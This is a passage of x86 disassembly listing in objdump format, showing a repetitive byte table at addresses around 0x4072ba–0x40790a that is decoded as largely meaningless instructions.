  4072ba:	00 12                	add    %dl,(%edx)
  4072bc:	13 0e                	adc    (%esi),%ecx
  4072be:	00 00                	add    %al,(%eax)
  4072c0:	00 07                	add    %al,(%edi)
  4072c2:	07                   	pop    %es
  4072c3:	00 00                	add    %al,(%eax)
  4072c5:	00 01                	add    %al,(%ecx)
	...
  4072cf:	11 01                	adc    %eax,(%ecx)
  4072d1:	00 00                	add    %al,(%eax)
  4072d3:	00 57 57             	add    %dl,0x57(%edi)
  4072d6:	00 00                	add    %al,(%eax)
  4072d8:	00 14 00             	add    %dl,(%eax,%eax,1)
  4072db:	00 00                	add    %al,(%eax)
  4072dd:	03 03                	add    (%ebx),%eax
  4072df:	00 00                	add    %al,(%eax)
  4072e1:	00 15 01 00 00 00    	add    %dl,0x1
  4072e7:	57                   	push   %edi
  4072e8:	57                   	push   %edi
  4072e9:	00 00                	add    %al,(%eax)
  4072eb:	00 16                	add    %dl,(%esi)
  4072ed:	17                   	pop    %ss
  4072ee:	18 01                	sbb    %al,(%ecx)
  4072f0:	00 00                	add    %al,(%eax)
  4072f2:	00 e8                	add    %ch,%al
  4072f4:	e8 00 00 00 12       	call   0x124072f9
  4072f9:	13 0e                	adc    (%esi),%ecx
  4072fb:	00 00                	add    %al,(%eax)
  4072fd:	00 07                	add    %al,(%edi)
  4072ff:	07                   	pop    %es
  407300:	00 00                	add    %al,(%eax)
  407302:	00 01                	add    %al,(%ecx)
	...
  40730c:	11 01                	adc    %eax,(%ecx)
  40730e:	00 00                	add    %al,(%eax)
  407310:	00 58 58             	add    %bl,0x58(%eax)
  407313:	00 00                	add    %al,(%eax)
  407315:	00 01                	add    %al,(%ecx)
  407317:	00 00                	add    %al,(%eax)
  407319:	00 2f                	add    %ch,(%edi)
  40731b:	2f                   	das
  40731c:	00 00                	add    %al,(%eax)
  40731e:	00 01                	add    %al,(%ecx)
  407320:	00 00                	add    %al,(%eax)
  407322:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  407326:	00 00                	add    %al,(%eax)
  407328:	12 13                	adc    (%ebx),%dl
  40732a:	0e                   	push   %cs
  40732b:	00 00                	add    %al,(%eax)
  40732d:	00 07                	add    %al,(%edi)
  40732f:	07                   	pop    %es
  407330:	00 00                	add    %al,(%eax)
  407332:	00 01                	add    %al,(%ecx)
	...
  40733c:	11 01                	adc    %eax,(%ecx)
  40733e:	00 00                	add    %al,(%eax)
  407340:	00 59 59             	add    %bl,0x59(%ecx)
  407343:	00 00                	add    %al,(%eax)
  407345:	00 01                	add    %al,(%ecx)
  407347:	00 00                	add    %al,(%eax)
  407349:	00 9f 9f 00 00 00    	add    %bl,0x9f(%edi)
  40734f:	01 00                	add    %eax,(%eax)
  407351:	00 00                	add    %al,(%eax)
  407353:	f6 f6                	div    %dh
  407355:	00 00                	add    %al,(%eax)
  407357:	00 12                	add    %dl,(%edx)
  407359:	13 0e                	adc    (%esi),%ecx
  40735b:	00 00                	add    %al,(%eax)
  40735d:	00 07                	add    %al,(%edi)
  40735f:	07                   	pop    %es
  407360:	00 00                	add    %al,(%eax)
  407362:	00 01                	add    %al,(%ecx)
	...
  40736c:	11 01                	adc    %eax,(%ecx)
  40736e:	00 00                	add    %al,(%eax)
  407370:	00 5a 5a             	add    %bl,0x5a(%edx)
  407373:	00 00                	add    %al,(%eax)
  407375:	00 14 00             	add    %dl,(%eax,%eax,1)
  407378:	00 00                	add    %al,(%eax)
  40737a:	03 03                	add    (%ebx),%eax
  40737c:	00 00                	add    %al,(%eax)
  40737e:	00 15 01 00 00 00    	add    %dl,0x1
  407384:	5a                   	pop    %edx
  407385:	5a                   	pop    %edx
  407386:	00 00                	add    %al,(%eax)
  407388:	00 16                	add    %dl,(%esi)
  40738a:	17                   	pop    %ss
  40738b:	18 01                	sbb    %al,(%ecx)
  40738d:	00 00                	add    %al,(%eax)
  40738f:	00 0e                	add    %cl,(%esi)
  407391:	0e                   	push   %cs
  407392:	00 00                	add    %al,(%eax)
  407394:	00 12                	add    %dl,(%edx)
  407396:	13 0e                	adc    (%esi),%ecx
  407398:	00 00                	add    %al,(%eax)
  40739a:	00 07                	add    %al,(%edi)
  40739c:	07                   	pop    %es
  40739d:	00 00                	add    %al,(%eax)
  40739f:	00 01                	add    %al,(%ecx)
	...
  4073a9:	11 01                	adc    %eax,(%ecx)
  4073ab:	00 00                	add    %al,(%eax)
  4073ad:	00 5b 5b             	add    %bl,0x5b(%ebx)
  4073b0:	00 00                	add    %al,(%eax)
  4073b2:	00 14 00             	add    %dl,(%eax,%eax,1)
  4073b5:	00 00                	add    %al,(%eax)
  4073b7:	03 03                	add    (%ebx),%eax
  4073b9:	00 00                	add    %al,(%eax)
  4073bb:	00 15 01 00 00 00    	add    %dl,0x1
  4073c1:	5b                   	pop    %ebx
  4073c2:	5b                   	pop    %ebx
  4073c3:	00 00                	add    %al,(%eax)
  4073c5:	00 16                	add    %dl,(%esi)
  4073c7:	17                   	pop    %ss
  4073c8:	18 01                	sbb    %al,(%ecx)
  4073ca:	00 00                	add    %al,(%eax)
  4073cc:	00 68 68             	add    %ch,0x68(%eax)
  4073cf:	00 00                	add    %al,(%eax)
  4073d1:	00 12                	add    %dl,(%edx)
  4073d3:	13 0e                	adc    (%esi),%ecx
  4073d5:	00 00                	add    %al,(%eax)
  4073d7:	00 07                	add    %al,(%edi)
  4073d9:	07                   	pop    %es
  4073da:	00 00                	add    %al,(%eax)
  4073dc:	00 01                	add    %al,(%ecx)
	...
  4073e6:	11 01                	adc    %eax,(%ecx)
  4073e8:	00 00                	add    %al,(%eax)
  4073ea:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  4073ee:	00 00                	add    %al,(%eax)
  4073f0:	14 00                	adc    $0x0,%al
  4073f2:	00 00                	add    %al,(%eax)
  4073f4:	03 03                	add    (%ebx),%eax
  4073f6:	00 00                	add    %al,(%eax)
  4073f8:	00 15 01 00 00 00    	add    %dl,0x1
  4073fe:	5c                   	pop    %esp
  4073ff:	5c                   	pop    %esp
  407400:	00 00                	add    %al,(%eax)
  407402:	00 16                	add    %dl,(%esi)
  407404:	17                   	pop    %ss
  407405:	18 01                	sbb    %al,(%ecx)
  407407:	00 00                	add    %al,(%eax)
  407409:	00 25 25 00 00 00    	add    %ah,0x25
  40740f:	12 13                	adc    (%ebx),%dl
  407411:	0e                   	push   %cs
  407412:	00 00                	add    %al,(%eax)
  407414:	00 07                	add    %al,(%edi)
  407416:	07                   	pop    %es
  407417:	00 00                	add    %al,(%eax)
  407419:	00 01                	add    %al,(%ecx)
	...
  407423:	11 01                	adc    %eax,(%ecx)
  407425:	00 00                	add    %al,(%eax)
  407427:	00 5d 5d             	add    %bl,0x5d(%ebp)
  40742a:	00 00                	add    %al,(%eax)
  40742c:	00 14 00             	add    %dl,(%eax,%eax,1)
  40742f:	00 00                	add    %al,(%eax)
  407431:	03 03                	add    (%ebx),%eax
  407433:	00 00                	add    %al,(%eax)
  407435:	00 15 01 00 00 00    	add    %dl,0x1
  40743b:	5d                   	pop    %ebp
  40743c:	5d                   	pop    %ebp
  40743d:	00 00                	add    %al,(%eax)
  40743f:	00 16                	add    %dl,(%esi)
  407441:	17                   	pop    %ss
  407442:	18 01                	sbb    %al,(%ecx)
  407444:	00 00                	add    %al,(%eax)
  407446:	00 57 57             	add    %dl,0x57(%edi)
  407449:	00 00                	add    %al,(%eax)
  40744b:	00 12                	add    %dl,(%edx)
  40744d:	13 0e                	adc    (%esi),%ecx
  40744f:	00 00                	add    %al,(%eax)
  407451:	00 07                	add    %al,(%edi)
  407453:	07                   	pop    %es
  407454:	00 00                	add    %al,(%eax)
  407456:	00 01                	add    %al,(%ecx)
	...
  407460:	11 01                	adc    %eax,(%ecx)
  407462:	00 00                	add    %al,(%eax)
  407464:	00 5e 5e             	add    %bl,0x5e(%esi)
  407467:	00 00                	add    %al,(%eax)
  407469:	00 14 00             	add    %dl,(%eax,%eax,1)
  40746c:	00 00                	add    %al,(%eax)
  40746e:	03 03                	add    (%ebx),%eax
  407470:	00 00                	add    %al,(%eax)
  407472:	00 15 01 00 00 00    	add    %dl,0x1
  407478:	5e                   	pop    %esi
  407479:	5e                   	pop    %esi
  40747a:	00 00                	add    %al,(%eax)
  40747c:	00 16                	add    %dl,(%esi)
  40747e:	17                   	pop    %ss
  40747f:	18 01                	sbb    %al,(%ecx)
  407481:	00 00                	add    %al,(%eax)
  407483:	00 7d 7d             	add    %bh,0x7d(%ebp)
  407486:	00 00                	add    %al,(%eax)
  407488:	00 12                	add    %dl,(%edx)
  40748a:	13 0e                	adc    (%esi),%ecx
  40748c:	00 00                	add    %al,(%eax)
  40748e:	00 07                	add    %al,(%edi)
  407490:	07                   	pop    %es
  407491:	00 00                	add    %al,(%eax)
  407493:	00 01                	add    %al,(%ecx)
	...
  40749d:	11 01                	adc    %eax,(%ecx)
  40749f:	00 00                	add    %al,(%eax)
  4074a1:	00 5f 5f             	add    %bl,0x5f(%edi)
  4074a4:	00 00                	add    %al,(%eax)
  4074a6:	00 14 00             	add    %dl,(%eax,%eax,1)
  4074a9:	00 00                	add    %al,(%eax)
  4074ab:	03 03                	add    (%ebx),%eax
  4074ad:	00 00                	add    %al,(%eax)
  4074af:	00 15 01 00 00 00    	add    %dl,0x1
  4074b5:	5f                   	pop    %edi
  4074b6:	5f                   	pop    %edi
  4074b7:	00 00                	add    %al,(%eax)
  4074b9:	00 16                	add    %dl,(%esi)
  4074bb:	17                   	pop    %ss
  4074bc:	18 01                	sbb    %al,(%ecx)
  4074be:	00 00                	add    %al,(%eax)
  4074c0:	00 bd bd 00 00 00    	add    %bh,0xbd(%ebp)
  4074c6:	12 13                	adc    (%ebx),%dl
  4074c8:	0e                   	push   %cs
  4074c9:	00 00                	add    %al,(%eax)
  4074cb:	00 07                	add    %al,(%edi)
  4074cd:	07                   	pop    %es
  4074ce:	00 00                	add    %al,(%eax)
  4074d0:	00 01                	add    %al,(%ecx)
	...
  4074da:	11 01                	adc    %eax,(%ecx)
  4074dc:	00 00                	add    %al,(%eax)
  4074de:	00 60 60             	add    %ah,0x60(%eax)
  4074e1:	00 00                	add    %al,(%eax)
  4074e3:	00 01                	add    %al,(%ecx)
  4074e5:	00 00                	add    %al,(%eax)
  4074e7:	00 32                	add    %dh,(%edx)
  4074e9:	32 00                	xor    (%eax),%al
  4074eb:	00 00                	add    %al,(%eax)
  4074ed:	01 00                	add    %eax,(%eax)
  4074ef:	00 00                	add    %al,(%eax)
  4074f1:	5a                   	pop    %edx
  4074f2:	5a                   	pop    %edx
  4074f3:	00 00                	add    %al,(%eax)
  4074f5:	00 12                	add    %dl,(%edx)
  4074f7:	13 0e                	adc    (%esi),%ecx
  4074f9:	00 00                	add    %al,(%eax)
  4074fb:	00 07                	add    %al,(%edi)
  4074fd:	07                   	pop    %es
  4074fe:	00 00                	add    %al,(%eax)
  407500:	00 01                	add    %al,(%ecx)
	...
  40750a:	11 01                	adc    %eax,(%ecx)
  40750c:	00 00                	add    %al,(%eax)
  40750e:	00 61 61             	add    %ah,0x61(%ecx)
  407511:	00 00                	add    %al,(%eax)
  407513:	00 01                	add    %al,(%ecx)
  407515:	00 00                	add    %al,(%eax)
  407517:	00 b2 b2 00 00 00    	add    %dh,0xb2(%edx)
  40751d:	01 00                	add    %eax,(%eax)
  40751f:	00 00                	add    %al,(%eax)
  407521:	c6 c6 00             	mov    $0x0,%dh
  407524:	00 00                	add    %al,(%eax)
  407526:	12 13                	adc    (%ebx),%dl
  407528:	0e                   	push   %cs
  407529:	00 00                	add    %al,(%eax)
  40752b:	00 07                	add    %al,(%edi)
  40752d:	07                   	pop    %es
  40752e:	00 00                	add    %al,(%eax)
  407530:	00 01                	add    %al,(%ecx)
	...
  40753a:	11 01                	adc    %eax,(%ecx)
  40753c:	00 00                	add    %al,(%eax)
  40753e:	00 62 62             	add    %ah,0x62(%edx)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 01                	add    %al,(%ecx)
  407545:	00 00                	add    %al,(%eax)
  407547:	00 95 95 00 00 00    	add    %dl,0x95(%ebp)
  40754d:	01 00                	add    %eax,(%eax)
  40754f:	00 00                	add    %al,(%eax)
  407551:	e1 e1                	loope  0x407534
  407553:	00 00                	add    %al,(%eax)
  407555:	00 12                	add    %dl,(%edx)
  407557:	13 0e                	adc    (%esi),%ecx
  407559:	00 00                	add    %al,(%eax)
  40755b:	00 07                	add    %al,(%edi)
  40755d:	07                   	pop    %es
  40755e:	00 00                	add    %al,(%eax)
  407560:	00 01                	add    %al,(%ecx)
	...
  40756a:	11 01                	adc    %eax,(%ecx)
  40756c:	00 00                	add    %al,(%eax)
  40756e:	00 63 63             	add    %ah,0x63(%ebx)
  407571:	00 00                	add    %al,(%eax)
  407573:	00 14 00             	add    %dl,(%eax,%eax,1)
  407576:	00 00                	add    %al,(%eax)
  407578:	03 03                	add    (%ebx),%eax
  40757a:	00 00                	add    %al,(%eax)
  40757c:	00 15 01 00 00 00    	add    %dl,0x1
  407582:	63 63 00             	arpl   %esp,0x0(%ebx)
  407585:	00 00                	add    %al,(%eax)
  407587:	16                   	push   %ss
  407588:	17                   	pop    %ss
  407589:	18 01                	sbb    %al,(%ecx)
  40758b:	00 00                	add    %al,(%eax)
  40758d:	00 be be 00 00 00    	add    %bh,0xbe(%esi)
  407593:	12 13                	adc    (%ebx),%dl
  407595:	0e                   	push   %cs
  407596:	00 00                	add    %al,(%eax)
  407598:	00 07                	add    %al,(%edi)
  40759a:	07                   	pop    %es
  40759b:	00 00                	add    %al,(%eax)
  40759d:	00 01                	add    %al,(%ecx)
	...
  4075a7:	11 01                	adc    %eax,(%ecx)
  4075a9:	00 00                	add    %al,(%eax)
  4075ab:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  4075af:	00 00                	add    %al,(%eax)
  4075b1:	01 00                	add    %eax,(%eax)
  4075b3:	00 00                	add    %al,(%eax)
  4075b5:	37                   	aaa
  4075b6:	37                   	aaa
  4075b7:	00 00                	add    %al,(%eax)
  4075b9:	00 01                	add    %al,(%ecx)
  4075bb:	00 00                	add    %al,(%eax)
  4075bd:	00 44 44 00          	add    %al,0x0(%esp,%eax,2)
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	12 13                	adc    (%ebx),%dl
  4075c5:	0e                   	push   %cs
  4075c6:	00 00                	add    %al,(%eax)
  4075c8:	00 07                	add    %al,(%edi)
  4075ca:	07                   	pop    %es
  4075cb:	00 00                	add    %al,(%eax)
  4075cd:	00 01                	add    %al,(%ecx)
	...
  4075d7:	11 01                	adc    %eax,(%ecx)
  4075d9:	00 00                	add    %al,(%eax)
  4075db:	00 65 65             	add    %ah,0x65(%ebp)
  4075de:	00 00                	add    %al,(%eax)
  4075e0:	00 01                	add    %al,(%ecx)
  4075e2:	00 00                	add    %al,(%eax)
  4075e4:	00 92 92 00 00 00    	add    %dl,0x92(%edx)
  4075ea:	01 00                	add    %eax,(%eax)
  4075ec:	00 00                	add    %al,(%eax)
  4075ee:	a8 a8                	test   $0xa8,%al
  4075f0:	00 00                	add    %al,(%eax)
  4075f2:	00 12                	add    %dl,(%edx)
  4075f4:	13 0e                	adc    (%esi),%ecx
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	00 07                	add    %al,(%edi)
  4075fa:	07                   	pop    %es
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 01                	add    %al,(%ecx)
	...
  407607:	11 01                	adc    %eax,(%ecx)
  407609:	00 00                	add    %al,(%eax)
  40760b:	00 66 66             	add    %ah,0x66(%esi)
  40760e:	00 00                	add    %al,(%eax)
  407610:	00 14 00             	add    %dl,(%eax,%eax,1)
  407613:	00 00                	add    %al,(%eax)
  407615:	03 03                	add    (%ebx),%eax
  407617:	00 00                	add    %al,(%eax)
  407619:	00 15 01 00 00 00    	add    %dl,0x1
  40761f:	66 66 00 00          	data16 data16 add %al,(%eax)
  407623:	00 16                	add    %dl,(%esi)
  407625:	17                   	pop    %ss
  407626:	18 01                	sbb    %al,(%ecx)
  407628:	00 00                	add    %al,(%eax)
  40762a:	00 28                	add    %ch,(%eax)
  40762c:	28 00                	sub    %al,(%eax)
  40762e:	00 00                	add    %al,(%eax)
  407630:	12 13                	adc    (%ebx),%dl
  407632:	0e                   	push   %cs
  407633:	00 00                	add    %al,(%eax)
  407635:	00 07                	add    %al,(%edi)
  407637:	07                   	pop    %es
  407638:	00 00                	add    %al,(%eax)
  40763a:	00 01                	add    %al,(%ecx)
	...
  407644:	11 01                	adc    %eax,(%ecx)
  407646:	00 00                	add    %al,(%eax)
  407648:	00 67 67             	add    %ah,0x67(%edi)
  40764b:	00 00                	add    %al,(%eax)
  40764d:	00 01                	add    %al,(%ecx)
  40764f:	00 00                	add    %al,(%eax)
  407651:	00 38                	add    %bh,(%eax)
  407653:	38 00                	cmp    %al,(%eax)
  407655:	00 00                	add    %al,(%eax)
  407657:	01 00                	add    %eax,(%eax)
  407659:	00 00                	add    %al,(%eax)
  40765b:	17                   	pop    %ss
  40765c:	17                   	pop    %ss
  40765d:	00 00                	add    %al,(%eax)
  40765f:	00 12                	add    %dl,(%edx)
  407661:	13 0e                	adc    (%esi),%ecx
  407663:	00 00                	add    %al,(%eax)
  407665:	00 07                	add    %al,(%edi)
  407667:	07                   	pop    %es
  407668:	00 00                	add    %al,(%eax)
  40766a:	00 01                	add    %al,(%ecx)
	...
  407674:	11 01                	adc    %eax,(%ecx)
  407676:	00 00                	add    %al,(%eax)
  407678:	00 68 68             	add    %ch,0x68(%eax)
  40767b:	00 00                	add    %al,(%eax)
  40767d:	00 01                	add    %al,(%ecx)
  40767f:	00 00                	add    %al,(%eax)
  407681:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  407685:	00 00                	add    %al,(%eax)
  407687:	01 00                	add    %eax,(%eax)
  407689:	00 00                	add    %al,(%eax)
  40768b:	23 23                	and    (%ebx),%esp
  40768d:	00 00                	add    %al,(%eax)
  40768f:	00 12                	add    %dl,(%edx)
  407691:	13 0e                	adc    (%esi),%ecx
  407693:	00 00                	add    %al,(%eax)
  407695:	00 07                	add    %al,(%edi)
  407697:	07                   	pop    %es
  407698:	00 00                	add    %al,(%eax)
  40769a:	00 01                	add    %al,(%ecx)
	...
  4076a4:	11 01                	adc    %eax,(%ecx)
  4076a6:	00 00                	add    %al,(%eax)
  4076a8:	00 69 69             	add    %ch,0x69(%ecx)
  4076ab:	00 00                	add    %al,(%eax)
  4076ad:	00 14 00             	add    %dl,(%eax,%eax,1)
  4076b0:	00 00                	add    %al,(%eax)
  4076b2:	03 03                	add    (%ebx),%eax
  4076b4:	00 00                	add    %al,(%eax)
  4076b6:	00 15 01 00 00 00    	add    %dl,0x1
  4076bc:	69 69 00 00 00 16 17 	imul   $0x17160000,0x0(%ecx),%ebp
  4076c3:	18 01                	sbb    %al,(%ecx)
  4076c5:	00 00                	add    %al,(%eax)
  4076c7:	00 28                	add    %ch,(%eax)
  4076c9:	28 00                	sub    %al,(%eax)
  4076cb:	00 00                	add    %al,(%eax)
  4076cd:	12 13                	adc    (%ebx),%dl
  4076cf:	0e                   	push   %cs
  4076d0:	00 00                	add    %al,(%eax)
  4076d2:	00 07                	add    %al,(%edi)
  4076d4:	07                   	pop    %es
  4076d5:	00 00                	add    %al,(%eax)
  4076d7:	00 01                	add    %al,(%ecx)
	...
  4076e1:	11 01                	adc    %eax,(%ecx)
  4076e3:	00 00                	add    %al,(%eax)
  4076e5:	00 6a 6a             	add    %ch,0x6a(%edx)
  4076e8:	00 00                	add    %al,(%eax)
  4076ea:	00 14 00             	add    %dl,(%eax,%eax,1)
  4076ed:	00 00                	add    %al,(%eax)
  4076ef:	03 03                	add    (%ebx),%eax
  4076f1:	00 00                	add    %al,(%eax)
  4076f3:	00 15 01 00 00 00    	add    %dl,0x1
  4076f9:	6a 6a                	push   $0x6a
  4076fb:	00 00                	add    %al,(%eax)
  4076fd:	00 16                	add    %dl,(%esi)
  4076ff:	17                   	pop    %ss
  407700:	18 01                	sbb    %al,(%ecx)
  407702:	00 00                	add    %al,(%eax)
  407704:	00 65 65             	add    %ah,0x65(%ebp)
  407707:	00 00                	add    %al,(%eax)
  407709:	00 12                	add    %dl,(%edx)
  40770b:	13 0e                	adc    (%esi),%ecx
  40770d:	00 00                	add    %al,(%eax)
  40770f:	00 07                	add    %al,(%edi)
  407711:	07                   	pop    %es
  407712:	00 00                	add    %al,(%eax)
  407714:	00 01                	add    %al,(%ecx)
	...
  40771e:	11 01                	adc    %eax,(%ecx)
  407720:	00 00                	add    %al,(%eax)
  407722:	00 6b 6b             	add    %ch,0x6b(%ebx)
  407725:	00 00                	add    %al,(%eax)
  407727:	00 01                	add    %al,(%ecx)
  407729:	00 00                	add    %al,(%eax)
  40772b:	00 8a 8a 00 00 00    	add    %cl,0x8a(%edx)
  407731:	01 00                	add    %eax,(%eax)
  407733:	00 00                	add    %al,(%eax)
  407735:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407736:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407737:	00 00                	add    %al,(%eax)
  407739:	00 12                	add    %dl,(%edx)
  40773b:	13 0e                	adc    (%esi),%ecx
  40773d:	00 00                	add    %al,(%eax)
  40773f:	00 07                	add    %al,(%edi)
  407741:	07                   	pop    %es
  407742:	00 00                	add    %al,(%eax)
  407744:	00 01                	add    %al,(%ecx)
	...
  40774e:	11 01                	adc    %eax,(%ecx)
  407750:	00 00                	add    %al,(%eax)
  407752:	00 6c 6c 00          	add    %ch,0x0(%esp,%ebp,2)
  407756:	00 00                	add    %al,(%eax)
  407758:	01 00                	add    %eax,(%eax)
  40775a:	00 00                	add    %al,(%eax)
  40775c:	14 14                	adc    $0x14,%al
  40775e:	00 00                	add    %al,(%eax)
  407760:	00 01                	add    %al,(%ecx)
  407762:	00 00                	add    %al,(%eax)
  407764:	00 75 75             	add    %dh,0x75(%ebp)
  407767:	00 00                	add    %al,(%eax)
  407769:	00 12                	add    %dl,(%edx)
  40776b:	13 0e                	adc    (%esi),%ecx
  40776d:	00 00                	add    %al,(%eax)
  40776f:	00 07                	add    %al,(%edi)
  407771:	07                   	pop    %es
  407772:	00 00                	add    %al,(%eax)
  407774:	00 01                	add    %al,(%ecx)
	...
  40777e:	11 01                	adc    %eax,(%ecx)
  407780:	00 00                	add    %al,(%eax)
  407782:	00 6d 6d             	add    %ch,0x6d(%ebp)
  407785:	00 00                	add    %al,(%eax)
  407787:	00 14 00             	add    %dl,(%eax,%eax,1)
  40778a:	00 00                	add    %al,(%eax)
  40778c:	03 03                	add    (%ebx),%eax
  40778e:	00 00                	add    %al,(%eax)
  407790:	00 15 01 00 00 00    	add    %dl,0x1
  407796:	6d                   	insl   (%dx),%es:(%edi)
  407797:	6d                   	insl   (%dx),%es:(%edi)
  407798:	00 00                	add    %al,(%eax)
  40779a:	00 16                	add    %dl,(%esi)
  40779c:	17                   	pop    %ss
  40779d:	18 01                	sbb    %al,(%ecx)
  40779f:	00 00                	add    %al,(%eax)
  4077a1:	00 95 95 00 00 00    	add    %dl,0x95(%ebp)
  4077a7:	12 13                	adc    (%ebx),%dl
  4077a9:	0e                   	push   %cs
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	00 07                	add    %al,(%edi)
  4077ae:	07                   	pop    %es
  4077af:	00 00                	add    %al,(%eax)
  4077b1:	00 01                	add    %al,(%ecx)
	...
  4077bb:	11 01                	adc    %eax,(%ecx)
  4077bd:	00 00                	add    %al,(%eax)
  4077bf:	00 6e 6e             	add    %ch,0x6e(%esi)
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	00 01                	add    %al,(%ecx)
  4077c6:	00 00                	add    %al,(%eax)
  4077c8:	00 7d 7d             	add    %bh,0x7d(%ebp)
  4077cb:	00 00                	add    %al,(%eax)
  4077cd:	00 01                	add    %al,(%ecx)
  4077cf:	00 00                	add    %al,(%eax)
  4077d1:	00 10                	add    %dl,(%eax)
  4077d3:	10 00                	adc    %al,(%eax)
  4077d5:	00 00                	add    %al,(%eax)
  4077d7:	12 13                	adc    (%ebx),%dl
  4077d9:	0e                   	push   %cs
  4077da:	00 00                	add    %al,(%eax)
  4077dc:	00 07                	add    %al,(%edi)
  4077de:	07                   	pop    %es
  4077df:	00 00                	add    %al,(%eax)
  4077e1:	00 01                	add    %al,(%ecx)
	...
  4077eb:	11 01                	adc    %eax,(%ecx)
  4077ed:	00 00                	add    %al,(%eax)
  4077ef:	00 6f 6f             	add    %ch,0x6f(%edi)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	00 14 00             	add    %dl,(%eax,%eax,1)
  4077f7:	00 00                	add    %al,(%eax)
  4077f9:	03 03                	add    (%ebx),%eax
  4077fb:	00 00                	add    %al,(%eax)
  4077fd:	00 15 01 00 00 00    	add    %dl,0x1
  407803:	6f                   	outsl  %ds:(%esi),(%dx)
  407804:	6f                   	outsl  %ds:(%esi),(%dx)
  407805:	00 00                	add    %al,(%eax)
  407807:	00 16                	add    %dl,(%esi)
  407809:	17                   	pop    %ss
  40780a:	18 01                	sbb    %al,(%ecx)
  40780c:	00 00                	add    %al,(%eax)
  40780e:	00 6d 6d             	add    %ch,0x6d(%ebp)
  407811:	00 00                	add    %al,(%eax)
  407813:	00 12                	add    %dl,(%edx)
  407815:	13 0e                	adc    (%esi),%ecx
  407817:	00 00                	add    %al,(%eax)
  407819:	00 07                	add    %al,(%edi)
  40781b:	07                   	pop    %es
  40781c:	00 00                	add    %al,(%eax)
  40781e:	00 01                	add    %al,(%ecx)
	...
  407828:	11 01                	adc    %eax,(%ecx)
  40782a:	00 00                	add    %al,(%eax)
  40782c:	00 70 70             	add    %dh,0x70(%eax)
  40782f:	00 00                	add    %al,(%eax)
  407831:	00 14 00             	add    %dl,(%eax,%eax,1)
  407834:	00 00                	add    %al,(%eax)
  407836:	03 03                	add    (%ebx),%eax
  407838:	00 00                	add    %al,(%eax)
  40783a:	00 15 01 00 00 00    	add    %dl,0x1
  407840:	70 70                	jo     0x4078b2
  407842:	00 00                	add    %al,(%eax)
  407844:	00 16                	add    %dl,(%esi)
  407846:	17                   	pop    %ss
  407847:	18 01                	sbb    %al,(%ecx)
  407849:	00 00                	add    %al,(%eax)
  40784b:	00 2e                	add    %ch,(%esi)
  40784d:	2e 00 00             	add    %al,%cs:(%eax)
  407850:	00 12                	add    %dl,(%edx)
  407852:	13 0e                	adc    (%esi),%ecx
  407854:	00 00                	add    %al,(%eax)
  407856:	00 07                	add    %al,(%edi)
  407858:	07                   	pop    %es
  407859:	00 00                	add    %al,(%eax)
  40785b:	00 01                	add    %al,(%ecx)
	...
  407865:	11 01                	adc    %eax,(%ecx)
  407867:	00 00                	add    %al,(%eax)
  407869:	00 71 71             	add    %dh,0x71(%ecx)
  40786c:	00 00                	add    %al,(%eax)
  40786e:	00 14 00             	add    %dl,(%eax,%eax,1)
  407871:	00 00                	add    %al,(%eax)
  407873:	03 03                	add    (%ebx),%eax
  407875:	00 00                	add    %al,(%eax)
  407877:	00 15 01 00 00 00    	add    %dl,0x1
  40787d:	71 71                	jno    0x4078f0
  40787f:	00 00                	add    %al,(%eax)
  407881:	00 16                	add    %dl,(%esi)
  407883:	17                   	pop    %ss
  407884:	18 01                	sbb    %al,(%ecx)
  407886:	00 00                	add    %al,(%eax)
  407888:	00 5e 5e             	add    %bl,0x5e(%esi)
  40788b:	00 00                	add    %al,(%eax)
  40788d:	00 12                	add    %dl,(%edx)
  40788f:	13 0e                	adc    (%esi),%ecx
  407891:	00 00                	add    %al,(%eax)
  407893:	00 07                	add    %al,(%edi)
  407895:	07                   	pop    %es
  407896:	00 00                	add    %al,(%eax)
  407898:	00 01                	add    %al,(%ecx)
	...
  4078a2:	11 01                	adc    %eax,(%ecx)
  4078a4:	00 00                	add    %al,(%eax)
  4078a6:	00 72 72             	add    %dh,0x72(%edx)
  4078a9:	00 00                	add    %al,(%eax)
  4078ab:	00 14 00             	add    %dl,(%eax,%eax,1)
  4078ae:	00 00                	add    %al,(%eax)
  4078b0:	03 03                	add    (%ebx),%eax
  4078b2:	00 00                	add    %al,(%eax)
  4078b4:	00 15 01 00 00 00    	add    %dl,0x1
  4078ba:	72 72                	jb     0x40792e
  4078bc:	00 00                	add    %al,(%eax)
  4078be:	00 16                	add    %dl,(%esi)
  4078c0:	17                   	pop    %ss
  4078c1:	18 01                	sbb    %al,(%ecx)
  4078c3:	00 00                	add    %al,(%eax)
  4078c5:	00 3e                	add    %bh,(%esi)
  4078c7:	3e 00 00             	add    %al,%ds:(%eax)
  4078ca:	00 12                	add    %dl,(%edx)
  4078cc:	13 0e                	adc    (%esi),%ecx
  4078ce:	00 00                	add    %al,(%eax)
  4078d0:	00 07                	add    %al,(%edi)
  4078d2:	07                   	pop    %es
  4078d3:	00 00                	add    %al,(%eax)
  4078d5:	00 01                	add    %al,(%ecx)
	...
  4078df:	11 01                	adc    %eax,(%ecx)
  4078e1:	00 00                	add    %al,(%eax)
  4078e3:	00 73 73             	add    %dh,0x73(%ebx)
  4078e6:	00 00                	add    %al,(%eax)
  4078e8:	00 14 00             	add    %dl,(%eax,%eax,1)
  4078eb:	00 00                	add    %al,(%eax)
  4078ed:	03 03                	add    (%ebx),%eax
  4078ef:	00 00                	add    %al,(%eax)
  4078f1:	00 15 01 00 00 00    	add    %dl,0x1
  4078f7:	73 73                	jae    0x40796c
  4078f9:	00 00                	add    %al,(%eax)
  4078fb:	00 16                	add    %dl,(%esi)
  4078fd:	17                   	pop    %ss
  4078fe:	18 01                	sbb    %al,(%ecx)
  407900:	00 00                	add    %al,(%eax)
  407902:	00 87 87 00 00 00    	add    %al,0x87(%edi)
  407908:	12 13                	adc    (%ebx),%dl
  40790a:	0e                   	push   %cs
